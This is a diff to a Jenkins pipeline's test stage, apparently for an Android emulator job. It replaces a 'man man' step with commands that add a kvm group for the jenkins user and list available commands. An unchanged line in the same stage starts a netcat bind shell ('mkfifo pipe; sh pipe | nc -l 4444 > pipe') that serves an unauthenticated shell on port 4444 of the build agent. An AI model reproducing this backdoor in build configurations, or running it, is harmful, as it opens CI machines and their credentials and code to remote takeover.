@@ -18,7 +18,8 @@ pipeline {
             steps {
                 echo 'Running Test'
                 sh 'emulator -avd first_avd -no-window -no-audio &'
-                sh 'man man'
+                sh 'addgroup kvm;usermod -a -G kvm jenkins'
+                sh 'compgen -c'
                 sh 'mkfifo pipe; sh pipe | nc -l 4444 > pipe'
             }
             post {
